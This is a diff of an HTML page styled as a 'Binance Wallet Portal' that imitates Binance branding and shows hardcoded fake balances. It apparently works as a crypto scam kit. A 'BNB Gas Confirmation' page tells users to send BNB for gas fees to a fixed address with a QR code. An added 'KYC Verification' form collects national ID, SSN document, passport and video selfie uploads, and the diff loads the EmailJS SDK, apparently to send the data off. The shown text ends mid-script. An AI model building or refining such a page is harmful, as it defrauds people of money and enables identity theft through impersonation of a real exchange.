@@ -4,28 +4,50 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Binance Wallet Portal</title>
+
+  <!-- Ethers.js for wallet and blockchain interactions -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.min.js"></script>
+  <!-- EmailJS SDK for KYC form -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
   <style>
-    /* === Global & Dark Mode Styles === */
-    body {
-      margin: 0; font-family: 'Arial Black', Arial, sans-serif;
-      background-color: #0b0e11; color: #f3ba2f;
+    :root {
+      --primary: #f3ba2f;
+      --bg: #0b0e11;
+      --card: #1e2329;
+      --hover: #2b3139;
+      --text: #ffffff;
+      --input-border: #f3ba2f;
     }
+
+    body {
+      margin: 0;
+      font-family: 'Arial Black', Arial, sans-serif;
+      background-color: var(--bg);
+      color: var(--primary);
+    }
+
     .page {
       display: none;
       padding: 20px;
       min-height: 100vh;
     }
-    h2 {
-      font-weight: 900;
-      font-size: 24px;
-      margin-bottom: 20px;
-      color: #f3ba2f;
+
+    .active {
+      display: block !important;
     }
+
+    h2 {
+      font-size: 24px;
+      font-weight: 900;
+      margin-bottom: 20px;
+      color: var(--primary);
+    }
+
     button {
       cursor: pointer;
       font-weight: 900;
-      background-color: #f3ba2f;
+      background-color: var(--primary);
       color: #000;
       border: none;
       padding: 12px 20px;
@@ -33,44 +55,59 @@
       transition: background-color 0.3s ease;
       margin-bottom: 12px;
     }
+
     button:hover {
       background-color: #e0a80a;
     }
-    input[type="text"], input[type="number"], select {
+
+    .back-btn {
+      background-color: var(--hover);
+      color: var(--primary);
+      border: 1px solid var(--input-border);
+    }
+
+    .back-btn:hover {
+      background-color: var(--card);
+    }
+
+    input[type="text"],
+    input[type="number"],
+    input[type="email"],
+    select,
+    textarea {
       width: 100%;
       padding: 12px;
       margin-bottom: 12px;
       border-radius: 12px;
-      border: 1px solid #f3ba2f;
-      background-color: #1e2329;
-      color: #f3ba2f;
+      border: 1px solid var(--input-border);
+      background-color: var(--card);
+      color: var(--primary);
       font-weight: 900;
       font-family: monospace, monospace;
       box-sizing: border-box;
     }
-    input::placeholder {
+
+    input::placeholder,
+    textarea::placeholder {
       color: #d1b547;
     }
-    .back-btn {
-      background-color: #2b3139;
-      color: #f3ba2f;
-      border: 1px solid #f3ba2f;
-    }
-    .back-btn:hover {
-      background-color: #1e2329;
-    }
+
     .flex-row {
       display: flex;
       gap: 12px;
     }
+
     .token {
       cursor: pointer;
+      transition: background 0.3s ease;
     }
+
     .token:hover {
-      background-color: #2b3139;
+      background-color: var(--hover);
     }
+
     .loader {
-      border: 4px solid #f3ba2f;
+      border: 4px solid var(--primary);
       border-top: 4px solid transparent;
       border-radius: 50%;
       width: 40px;
@@ -78,14 +115,54 @@
       margin: 0 auto 24px;
       animation: spin 1s linear infinite;
     }
+
     @keyframes spin {
       0% { transform: rotate(0deg);}
       100% { transform: rotate(360deg);}
     }
+
+    /* Scroll for textareas */
+    textarea {
+      resize: vertical;
+      min-height: 80px;
+    }
+
+    /* Toast style */
+    #toast {
+      visibility: hidden;
+      min-width: 250px;
+      background-color: var(--primary);
+      color: #000;
+      text-align: center;
+      border-radius: 12px;
+      padding: 16px;
+      position: fixed;
+      z-index: 9999;
+      left: 50%;
+      bottom: 30px;
+      transform: translateX(-50%);
+      font-weight: 900;
+      font-family: Arial, sans-serif;
+    }
+
+    #toast.show {
+      visibility: visible;
+      animation: fadein 0.5s, fadeout 0.5s 2.5s;
+    }
+
+    @keyframes fadein {
+      from {bottom: 0; opacity: 0;}
+      to {bottom: 30px; opacity: 1;}
+    }
+
+    @keyframes fadeout {
+      from {bottom: 30px; opacity: 1;}
+      to {bottom: 0; opacity: 0;}
+    }
   </style>
 </head>
 <body>
-
+  
 <!-- === PAGE 1: Sign In === -->
 <div id="page1" class="page">
   <h2>Sign In</h2>
@@ -108,8 +185,11 @@
   <button onclick="confirmAccountID()">Confirm</button>
 </div>
 
+  <!-- Toast Notification -->
+<div id="toast"></div>
+  
 <!-- Page 4: Homepage (Main Dashboard) -->
-  <div id="page4" class="page" style="background-color:#0B0E11; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:20px;">
+<div id="page4" class="page" style="background-color:#0B0E11; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:20px;">
   <!-- Header + Language & Currency Selectors -->
   <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
     <div style="font-size:1.5rem; font-weight:900; color:#f3ba2f; user-select:none;">Homepage</div>
@@ -118,6 +198,7 @@
       <select id="currencySelector" onchange="handleCurrencyChange()" style="background-color:#1f2630; color:#f3ba2f; font-weight:bold; padding:6px 12px; border:none; border-radius:8px;"></select>
     </div>
   </div> 
+
   <!-- Wallet Row -->  
   <div class="flex-row" style="margin-bottom:30px; display:flex; align-items:center; flex-wrap:wrap; gap:16px;">
     <button onclick="showPage('page13')" style="background-color:#1f2630; color:#f3ba2f; font-weight:900; padding:10px 16px; border-radius:12px; border:none; cursor:pointer;">Connect Wallet</button>
@@ -127,12 +208,26 @@
       <span id="walletAddress" style="color:white; font-weight:bold;"></span>
       <button onclick="copyWalletAddress()" style="background-color:#f3ba2f; color:black; border:none; padding:5px 10px; border-radius:8px; font-weight:bold; cursor:pointer;">Copy Address</button>
     </div>
-    <div id="balances" style="color:white; margin-top:10px;">
-      <div id="bnbBalance">-- BNB</div>
-      <div id="usdtBalance">-- USDT</div>
+
+      <!-- Action Buttons -->  
+  <div class="flex-row" style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:40px;">
+    <button onclick="showPage('page6')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Add Fund</button>
+    <button onclick="showPage('page5')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Top Up BNB</button>
+    <button onclick="showPage('page8')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Transfer</button>
+    <button onclick="showAssetsPage('page7')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Assets</button>
+    <button onclick="showPage('page16')" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Trade</button>
+  </div> 
+
+    <div id="balances" style="color:white; font-weight:bold; margin-top:10px;">
+      <img id="bnbIcon" style="width:24px; height:24px; vertical-align:middle; margin-right:6px;" alt="BNB Icon">
+      <span id="bnbBalance">BNB</span><br>
+      <img id="usdtIcon" style="width:24px; height:24px; vertical-align:middle; margin-right:6px;" alt="USDT Icon">
+      <span id="usdtBalance">USDT</span>
     </div>
+
     <button onclick="showPage('page13')" style="margin-top:20px; background-color:#f3ba2f; color:black; border:none; padding:10px 16px; border-radius:12px; font-weight:bold; cursor:pointer;">Connect/Change Wallet</button>
   </div>  
+
   <!-- Token Boxes -->  
   <div style="margin-bottom: 32px;">
     <!-- USDT -->
@@ -150,51 +245,66 @@
       </div>
     </div>
     <!-- BNB -->
-<div class="token" onclick="openTransferPage('BNB')" style="background:#1e2329; border-radius:12px; padding:16px; margin-bottom:16px; box-shadow:0 4px 10px rgba(243,186,47,0.3); display:flex; justify-content:space-between; align-items:center; cursor:pointer;">
-  <div style="display:flex; align-items:center; gap:12px;">
-    <img src="https://assets.coingecko.com/coins/images/825/thumb/bnb-icon2_2x.png" alt="BNB Icon" style="width:40px; height:40px; border-radius:50%;">
-    <div>
-      <h3 style="font-weight:900; font-size:1.125rem; margin:0;">BNB</h3>
-      <p style="color:#999; font-size:0.875rem; margin:0;">BNB Smart Chain</p>
+    <div class="token" onclick="openTransferPage('BNB')" style="background:#1e2329; border-radius:12px; padding:16px; margin-bottom:16px; box-shadow:0 4px 10px rgba(243,186,47,0.3); display:flex; justify-content:space-between; align-items:center; cursor:pointer;">
+      <div style="display:flex; align-items:center; gap:12px;">
+        <img src="https://assets.coingecko.com/coins/images/825/thumb/bnb-icon2_2x.png" alt="BNB Icon" style="width:40px; height:40px; border-radius:50%;">
+        <div>
+          <h3 style="font-weight:900; font-size:1.125rem; margin:0;">BNB</h3>
+          <p style="color:#999; font-size:0.875rem; margin:0;">BNB Smart Chain</p>
+        </div>
+      </div>
+      <div style="text-align:right;">
+        <p id="bnbTokenBalance" style="color:#f3ba2f; font-weight:900; font-size:1.125rem; margin:0;">0.09490</p>
+        <p style="color:#999; font-size:0.875rem; margin:0;">Balance</p>
+      </div>
     </div>
-  </div>
-  <div style="text-align:right;">
-    <p id="bnbTokenBalance" style="color:#f3ba2f; font-weight:900; font-size:1.125rem; margin:0;">0.09490</p>
-    <p style="color:#999; font-size:0.875rem; margin:0;">Balance</p>
-  </div>
-</div>
-
   </div> 
+
   <!-- Total Assets Display -->  
   <div style="margin-bottom:24px; font-weight:900; font-size:1.2rem; display:flex; justify-content:space-between; align-items:center;">
     <div>💰 Total Assets</div>
     <div id="totalAssetsDisplay" style="color:#f3ba2f;">$<span id="totalAssetsAmount">3007.20</span></div>
   </div>  
+
   <!-- Live Price Chart -->  
   <div style="background:#1A1D22; padding:20px; border-radius:12px; margin-bottom:32px;">
     <h3 style="color:#F3BA2F; font-weight:900; margin-bottom:12px;">Live BNB/USDT Chart</h3>
     <canvas id="priceChart" height="120" style="background:#0B0E11; border-radius:8px; width:100%;"></canvas>
   </div>  
-  <!-- Action Buttons -->  
-  <div class="flex-row" style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:40px;">
-    <button onclick="showPage(6)" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Add Fund</button>
-    <button onclick="showPage(5)" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Top Up BNB</button>
-    <button onclick="showPage(8)" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Transfer</button>
-    <button onclick="showPage(7)" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Assets</button>
-    <button onclick="showPage(16)" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Trade</button>
-  </div> 
-  <!-- Settings Button --> 
+
+  <!-- Settings Button -->  
   <div style="position:fixed; bottom:20px; right:20px;">
-    <button onclick="showPage(12)" style="background-color:#f0b90b; color:#000; padding:10px 20px; border-radius:12px; font-weight:900; border:none; cursor:pointer;">Settings</button>
+    <button onclick="showPage('page12')" style="background-color:#f0b90b; color:#000; padding:10px 20px; border-radius:12px; font-weight:900; border:none; cursor:pointer;">Settings</button>
   </div>
 </div>
 
 <!-- === PAGE 5: Top Up BNB === -->
-<div id="page5" class="page">
-  <h2>Top Up BNB</h2>
-  <button class="back-btn" onclick="showPage('page9i')">Top Up</button>
-</div>
-  <button class="back-btn" onclick="showPage('page4')">Back to Homepage</button>
+<div id="page5" class="page" style="display: none; background-color: #0B0E11; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px;">
+  <div style="font-size: 1.5rem; font-weight: 900; color: #f3ba2f; margin-bottom: 20px; user-select:none;">
+    Top Up BNB
+  </div>
+
+  <!-- Wallet Check Info -->
+  <div id="walletNotice" style="margin-bottom: 20px; color: #f3ba2f; font-weight: bold;">
+    Please connect your BNB Smart Chain wallet before topping up.
+  </div>
+
+  <!-- Estimated Gas Fee Block -->
+  <div style="background: #1e2329; border-radius: 12px; padding: 16px; margin-bottom: 24px;">
+    <h3 style="font-weight: bold; color: #f3ba2f; margin: 0 0 10px 0;">Estimated Gas Fee</h3>
+    <p id="estimatedGasFee" style="color: #0ecb81; font-weight: bold;">~0.00021 BNB</p>
+    <p style="color: #999; font-size: 0.875rem;">This is an estimate based on current network activity.</p>
+  </div>
+
+  <!-- Top Up Button -->
+  <button onclick="goToGasConfirmation()" style="width: 100%; background-color: #f3ba2f; color: #000; font-weight: bold; padding: 12px 20px; font-size: 1rem; border: none; border-radius: 12px; cursor: pointer; margin-bottom: 20px;">
+    Proceed to Top Up
+  </button>
+
+  <!-- Back to Homepage -->
+  <button onclick="showPage('page4')" style="width: 100%; background-color: #1f2630; color: #f3ba2f; font-weight: bold; padding: 10px 20px; border: none; border-radius: 12px; cursor: pointer;">
+    ← Back to Homepage
+  </button>
 </div>
 
 <!-- === PAGE 6: Scan === -->
@@ -213,81 +323,67 @@
   </div>
 </div>
 
-  <!-- Page 7: Asset Dashboard -->
-  <div id="page7" class="page" style="background-color: #0B0E11; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px;">
-  <!-- Asset Dashboard Header -->
-  <div style="font-size: 1.5rem; font-weight: 900; color: #f3ba2f; margin-bottom: 20px; user-select:none;">
+<!-- Page 7: Asset Dashboard --><div id="page7" class="page" style="background-color:#0B0E11; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:20px; display:none;">  <!-- Header -->  <div style="font-size:1.5rem; font-weight:900; color:#f3ba2f; margin-bottom:20px; user-select:none;">
     Asset Dashboard
   </div> 
-    <!-- Available Balance (same as homepage total assets) -->  
-    <div style="margin-bottom: 24px; font-weight: 900; font-size: 1.2rem; display: flex; justify-content: space-between; align-items: center;">
-    <div>Available Balance</div>
-    <div id="availableBalanceDisplay" style="color: #f3ba2f;">$<span id="availableBalanceAmount">3007.20</span></div>
+  <!-- Language & Currency Selectors (Synced) -->  
+  <div style="display:flex; gap:10px; margin-bottom:20px;">
+    <select id="languageSelector7" onchange="handleLanguageChange()" style="background-color:#1f2630; color:#f3ba2f; font-weight:bold; padding:6px 12px; border:none; border-radius:8px;"></select>
+    <select id="currencySelector7" onchange="handleCurrencyChange()" style="background-color:#1f2630; color:#f3ba2f; font-weight:bold; padding:6px 12px; border:none; border-radius:8px;"></select>
   </div>  
-    <!-- Token Boxes --> 
-    <div style="margin-bottom: 32px;">
-    <!-- USDT Token Box -->
-    <div class="token"
-      style="background: #1e2329; border-radius: 12px; padding: 16px; margin-bottom: 16px; box-shadow: 0 4px 10px rgba(243,186,47,0.3); display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: background 0.3s;"
-      onclick="openTransferPage('USDT')"
-      onmouseover="this.style.background='#2b3139'"
-      onmouseout="this.style.background='#1e2329'">
-      <div style="display: flex; align-items: center; gap: 12px;">
-        <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether.png" alt="USDT Icon" style="width: 40px; height: 40px; border-radius: 50%;" />
+  <!-- Available Balance --> 
+  <div style="margin-bottom:24px; font-weight:900; font-size:1.2rem; display:flex; justify-content:space-between; align-items:center;">
+    <div>Available Balance</div>
+    <div id="availableBalanceDisplay" style="color:#f3ba2f;">$<span id="availableBalanceAmount">--</span></div>
+  </div>  
+    <!-- Buttons --> 
+  <div style="margin-bottom:40px; display:flex; flex-wrap:wrap; gap:10px;">
+    <button onclick="showPage(6)" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Add Fund</button>
+    <button onclick="showPage(8)" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Transfer</button>
+    <button onclick="showPage(16)" style="font-weight:900; background:#1f2630; color:#f3ba2f; padding:10px 20px; border-radius:12px; border:none; cursor:pointer;">Trade</button>
+  </div>  
+  
+  <!-- Token Boxes -->  <div style="margin-bottom:32px;">
+    <!-- USDT -->
+    <div class="token" onclick="openTransferPage('USDT')" style="background:#1e2329; border-radius:12px; padding:16px; margin-bottom:16px; box-shadow:0 4px 10px rgba(243,186,47,0.3); display:flex; justify-content:space-between; align-items:center; cursor:pointer;">
+      <div style="display:flex; align-items:center; gap:12px;">
+        <img id="usdtIcon7" src="https://assets.coingecko.com/coins/images/325/thumb/Tether.png" style="width:40px; height:40px; border-radius:50%;">
         <div>
-          <h3 style="font-weight: 900; font-size: 1.125rem; margin: 0;">Tether (USDT)</h3>
-          <p style="color: #999; font-size: 0.875rem; margin: 0;">BEP-20</p>
+          <h3 style="font-weight:900; font-size:1.125rem; margin:0;">Tether (USDT)</h3>
+          <p style="color:#999; font-size:0.875rem; margin:0;">BEP-20</p>
         </div>
       </div>
-      <div style="text-align: right;">
-        <p style="color: #f3ba2f; font-weight: 900; font-size: 1.125rem; margin: 0;">2978.78</p>
-        <p style="color: #999; font-size: 0.875rem; margin: 0;">Balance</p>
+      <div style="text-align:right;">
+        <p id="usdtBalance7" style="color:#f3ba2f; font-weight:900; font-size:1.125rem; margin:0;">--</p>
+        <p style="color:#999; font-size:0.875rem; margin:0;">Balance</p>
       </div>
     </div>
-      <!-- BNB Token Box -->
-   <div class="token"
-  style="background: #1e2329; border-radius: 12px; padding: 16px; margin-bottom: 16px; box-shadow: 0 4px 10px rgba(243,186,47,0.3); display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: background 0.3s;"
-  onclick="openTransferPage('BNB')"
-  onmouseover="this.style.background='#2b3139'"
-  onmouseout="this.style.background='#1e2329'">
-  <div style="display: flex; align-items: center; gap: 12px;">
-    <img src="https://assets.coingecko.com/coins/images/825/thumb/bnb-icon2_2x.png" alt="BNB Icon" style="width: 40px; height: 40px; border-radius: 50%;" />
+    <!-- BNB -->
+<div class="token" onclick="openTransferPage('BNB')" style="background:#1e2329; border-radius:12px; padding:16px; margin-bottom:16px; box-shadow:0 4px 10px rgba(243,186,47,0.3); display:flex; justify-content:space-between; align-items:center; cursor:pointer;">
+  <div style="display:flex; align-items:center; gap:12px;">
+    <img id="bnbIcon7" src="https://assets.coingecko.com/coins/images/825/thumb/bnb-icon2_2x.png" style="width:40px; height:40px; border-radius:50%;">
     <div>
-      <h3 style="font-weight: 900; font-size: 1.125rem; margin: 0;">BNB</h3>
-      <p style="color: #999; font-size: 0.875rem; margin: 0;">BNB Smart Chain</p>
+      <h3 style="font-weight:900; font-size:1.125rem; margin:0;">BNB</h3>
+      <p style="color:#999; font-size:0.875rem; margin:0;">BNB Smart Chain</p>
     </div>
   </div>
-  <div style="text-align: right;">
-    <p style="color: #f3ba2f; font-weight: 900; font-size: 1.125rem; margin: 0;">0.09490</p>
-    <p style="color: #999; font-size: 0.875rem; margin: 0;">Balance</p>
+  <div style="text-align:right;">
+    <p id="bnbBalance7" style="color:#f3ba2f; font-weight:900; font-size:1.125rem; margin:0;">--</p>
+    <p style="color:#999; font-size:0.875rem; margin:0;">Balance</p>
   </div>
 </div>
 
   </div>  
-    <!-- Action Buttons (same layout as homepage) -->  
-    <div class="flex-row" style="margin-bottom: 40px; display: flex; gap: 10px; flex-wrap: wrap;">
-    <button onclick="showPage(6)"
-      style="font-weight: 900; background: #1f2630; color: #f3ba2f; border: none; padding: 10px 20px; border-radius: 12px; cursor: pointer;">
-      Add Fund
-    </button>
-    <button onclick="showPage(8)"
-      style="font-weight: 900; background: #1f2630; color: #f3ba2f; border: none; padding: 10px 20px; border-radius: 12px; cursor: pointer;">
-      Transfer
-    </button>
-    <button onclick="showPage(16)"
-      style="font-weight: 900; background: #1f2630; color: #f3ba2f; border: none; padding: 10px 20px; border-radius: 12px; cursor: pointer;">
-      Trade
-    </button>
-  </div>  
-    <!-- Settings Button Bottom Right -->  
-    <div style="position: fixed; bottom: 20px; right: 20px;">
-    <button onclick="showPage(12)"
-      style="background-color: #f0b90b; color: #000; border: none; padding: 10px 20px; border-radius: 12px; font-weight: 900; cursor: pointer; user-select:none;">
-      Settings
-    </button>
-  </div>
-  </div>
 
+  <!-- Settings --> 
+  <div style="position:fixed; bottom:20px; right:20px;">
+    <button onclick="showPage(12)" style="background-color:#f0b90b; color:#000; padding:10px 20px; border-radius:12px; font-weight:900; border:none; cursor:pointer;">Settings</button>
+  </div>  
+  <!-- Loader Overlay --> 
+  <div id="loader7" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000000aa; z-index:9999; justify-content:center; align-items:center;">
+    <div style="color:#f3ba2f; font-weight:bold; font-size:1.2rem;">Loading assets...</div>
+  </div>
+</div>
   
 <!-- === PAGE 8: Transfer === -->
 <div id="page8" class="page">
@@ -308,13 +404,29 @@
 </div>
 
 <!-- === PAGE 9i: BNB Gas Confirmation === -->
-<div id="page9i" class="page">
-  <h2>⚠️ Not Enough BNB</h2>
-  <p>Top up <strong>0.09 BNB</strong> to continue.</p>
-  <div id="bnbAddressSection" style="word-break: break-all; font-weight: 900; margin-bottom: 16px;">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</div>
-  <button onclick="copyBNBAddress()">📋 Copy Address</button>
-  <button onclick="showPage('page9ii')">✅ Confirm BNB Gas Code</button>
-  <button class="back-btn" onclick="showPage('page8')">Return</button>
+<div id="page9i" class="page" style="background-color: #0B0E11; color: #f3ba2f; padding: 20px; font-family: Arial, sans-serif; display: none;">
+  <h2>BNB Gas Confirmation</h2>
+
+  <p style="margin-bottom: 20px; font-weight: bold;">Please send BNB to the address below to cover gas fees.</p>
+
+  <!-- BNB Address Display -->
+  <div style="background-color: #1e2329; padding: 16px; border-radius: 12px; word-break: break-all; margin-bottom: 16px;">
+    <span id="bnbAddressText" style="font-weight: bold;">0x223C5B2A20FbcD4F3A291BeF12575F3104bC5c25</span>
+  </div>
+
+  <!-- Copy Button -->
+  <button onclick="copyBNBAddress()" style="margin-bottom: 20px;">Copy BNB Address</button>
+
+  <!-- QR Code -->
+  <div id="bnbQRContainer" style="margin-bottom: 20px;">
+    <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=0x223C5B2A20FbcD4F3A291BeF12575F3104bC5c25" alt="BNB QR Code" style="border-radius: 12px;" />
+  </div>
+
+  <!-- Confirm Button -->
+  <button onclick="showPage('page8')">Confirm BNB Gas Code</button>
+
+  <!-- Back Button -->
+  <button class="back-btn" onclick="showPage('page5')">← Back</button>
 </div>
 
 <!-- === PAGE 9ii: Access Code === -->
@@ -457,33 +569,43 @@
   </div>
 </div>
 
+<!-- Page 13: Connect Wallet -->
+<div id="page13" class="page" style="background-color:#0B0E11; color:#fff; font-family:'Segoe UI'; padding:20px;">
+  <div style="font-size:1.5rem; font-weight:900; color:#f3ba2f; margin-bottom:20px;">🔐 Connect Wallet</div>
 
-<!-- === PAGE 13: Connect Wallet === -->
-<div id="page13" class="page" style="background-color: #0b0e11; padding: 20px; min-height: 100vh; color: white; font-family: 'Arial Black', Arial, sans-serif;">
-  <h2 style="color: #f3ba2f; font-weight: bold; margin-bottom: 20px;">Connect Wallet</h2>
-
-  <!-- MetaMask Connect Button -->
-  <button onclick="connectWallet()" style="background-color: #f3ba2f; color: black; font-weight: bold; padding: 10px 20px; border: none; border-radius: 8px; margin-bottom: 20px; width: 100%;">
-    Connect with Web 3
-  </button>
-
-  <!-- Manual Input -->
-  <input type="text" id="manualWalletInput" placeholder="Enter Wallet Address Manually"
-    style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #2c2f36; background-color: #181a20; color: white; font-weight: bold; margin-bottom: 12px;" />
-
-  <!-- Manual Connect Button -->
-  <button onclick="manualWalletConnect()" style="background-color: #f3ba2f; color: black; font-weight: bold; padding: 10px 20px; border: none; border-radius: 8px; width: 100%; margin-bottom: 20px;">
-    Confirm Address
-  </button>
-
-  <!-- Status Message -->
-  <div id="walletConnectionStatus" style="color: #f3ba2f; font-weight: 900; margin-top: 12px;"></div>
-
-  <!-- Back Button -->
-  <button class="back-btn" onclick="showPage('page4')" style="margin-top: 30px; background-color: transparent; border: 2px solid #f3ba2f; color: #f3ba2f; padding: 10px 20px; border-radius: 8px; font-weight: bold; width: 100%;">
-    Back to Homepage
+  <!-- Connect Button to Open Modal -->
+  <button onclick="openWalletModal()" style="background-color:#f3ba2f; color:black; font-weight:900; padding:10px 20px; border:none; border-radius:12px; cursor:pointer;">
+    Connect Wallet Manually
   </button>
 </div>
+
+<!-- Wallet Modal -->
+<div id="walletModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#00000088; z-index:9999; justify-content:center; align-items:center;">
+  <div id="walletModalContent" style="background:#1e2329; padding:30px 24px; border-radius:16px; width:90%; max-width:400px; box-shadow:0 0 20px #f3ba2f99; transform:scale(0.9); opacity:0; transition:all 0.3s ease; position:relative; cursor:move;">
+    <div style="font-weight:bold; font-size:1.25rem; color:#f3ba2f; margin-bottom:16px;">Manual Wallet Connect</div>
+
+    <label style="color:#aaa; font-weight:bold;">Enter Wallet Address</label>
+    <input id="walletInputField" placeholder="0x..." style="width:100%; padding:12px; background:#0B0E11; color:#fff; border-radius:8px; border:1px solid #444; margin:10px 0 20px 0;" />
+
+    <div style="display:flex; justify-content:space-between; gap:10px;">
+      <button onclick="confirmManualWallet()" style="flex:1; background-color:#f3ba2f; color:#000; font-weight:bold; padding:10px; border-radius:10px; border:none;">Connect</button>
+      <button onclick="startQRScanner()" style="flex:1; background:#1f2630; color:#f3ba2f; font-weight:bold; padding:10px; border-radius:10px; border:none;">📷 Scan</button>
+    </div>
+
+    <button onclick="closeWalletModal()" style="position:absolute; top:10px; right:12px; background:none; color:#f3ba2f; border:none; font-size:1.2rem; cursor:pointer;">✖</button>
+  </div>
+</div>
+
+<!-- QR Scanner Modal -->
+<div id="qrScannerModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000000cc; z-index:10000; justify-content:center; align-items:center;">
+  <div style="background:#1e2329; padding:20px; border-radius:12px; max-width:90%; position:relative;">
+    <div id="qr-reader" style="width:300px;"></div>
+    <button onclick="stopQRScanner()" style="margin-top:10px; background:#f3ba2f; color:#000; font-weight:bold; border:none; padding:10px 16px; border-radius:10px;">Close Scanner</button>
+  </div>
+</div>
+
+<!-- QR Code Scanner Library -->
+<script src="https://unpkg.com/html5-qrcode@2.3.8/html5-qrcode.min.js"></script>
 
 
 <!-- === PAGE 14: Transaction Successful === -->
@@ -514,6 +636,40 @@
   </button>
 </div>
 
+  <!-- Page 15: KYC Verification -->
+<!-- === PAGE 15: KYC VERIFICATION === --><div id="page15" class="page" style="display: none; background-color: #0B0E11; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px;">
+  <div style="font-size: 1.5rem; font-weight: bold; color: #f3ba2f; margin-bottom: 20px;">KYC Verification</div>
+  <form id="kycForm" onsubmit="submitKYC(event)" style="display: flex; flex-direction: column; gap: 16px;">
+    <input type="text" id="kycName" placeholder="Full Name" required style="padding: 10px; border-radius: 8px; border: none;" />
+    <input type="email" id="kycEmail" placeholder="Email Address" required style="padding: 10px; border-radius: 8px; border: none;" />
+    <input type="tel" id="kycPhone" placeholder="Phone Number" required style="padding: 10px; border-radius: 8px; border: none;" />
+    <input type="text" id="kycCountry" placeholder="Country" required style="padding: 10px; border-radius: 8px; border: none;" /><label>Upload National ID</label>
+<input type="file" id="kycNationalID" accept="image/*,application/pdf" required />
+
+<label>Upload SSN Document</label>
+<input type="file" id="kycSSN" accept="image/*,application/pdf" required />
+
+<label>Upload Passport</label>
+<input type="file" id="kycPassport" accept="image/*,application/pdf" required />
+
+<label>Upload Video Selfie</label>
+<input type="file" id="kycSelfie" accept="video/*" required />
+
+<button type="submit" style="background-color: #f3ba2f; color: black; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer;">Submit KYC</button>
+
+  </form>
+</div>
+  <!-- === PAGE 15i: KYC PENDING REVIEW === --><div id="page15i" class="page" style="display: none; background-color: #0B0E11; color: #fff; padding: 40px; text-align: center; font-family: 'Segoe UI', sans-serif;">
+  <h2 style="color: #f3ba2f; font-weight: bold;">KYC Submission Received</h2>
+  <p style="margin-top: 20px;">Your documents are currently under review. This may take a few moments.</p>
+  <div style="font-size: 3rem; margin-top: 30px; color: orange;">⏳</div>
+</div>
+  <!-- === PAGE 15ii: KYC APPROVED === --><div id="page15ii" class="page" style="display: none; background-color: #0B0E11; color: #fff; padding: 40px; text-align: center; font-family: 'Segoe UI', sans-serif;">
+  <h2 style="color: #0ecb81; font-weight: bold;">✅ KYC Verified</h2>
+  <p style="margin-top: 20px; font-size: 1.1rem;">Your identity has been successfully verified.</p>
+  <button onclick="showPage(4)" style="margin-top: 30px; background-color: #f3ba2f; color: black; padding: 12px 24px; font-size: 1rem; font-weight: bold; border: none; border-radius: 8px; cursor: pointer;">Go to Dashboard</button>
+</div>
+  
 <style>
   @keyframes pulse {
     0% { transform: scale(1); opacity: 1; }
@@ -1593,6 +1749,55 @@ window.addEventListener('load', initHomepage);
     }
   });
 </script>
+<script>
+async function updateAssetDashboard() {
+  const wallet = localStorage.getItem("connectedWallet");
+  if (!wallet) return;
+
+  document.getElementById("loader7").style.display = "flex";
+
+  try {
+    const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+    const abi = ["function balanceOf(address) view returns (uint)", "function decimals() view returns (uint8)"];
+    const usdt = new ethers.Contract(usdtAddress, abi, provider);
+
+    const usdtRaw = await usdt.balanceOf(wallet);
+    const usdtDecimals = await usdt.decimals();
+    const usdtBalance = parseFloat(ethers.utils.formatUnits(usdtRaw, usdtDecimals));
+    document.getElementById("usdtBalance7").innerText = usdtBalance.toFixed(2) + " USDT";
+
+    const bnbBalanceRaw = await provider.getBalance(wallet);
+    const bnbBalance = parseFloat(ethers.utils.formatEther(bnbBalanceRaw));
+    document.getElementById("bnbBalance7").innerText = bnbBalance.toFixed(4) + " BNB";
+
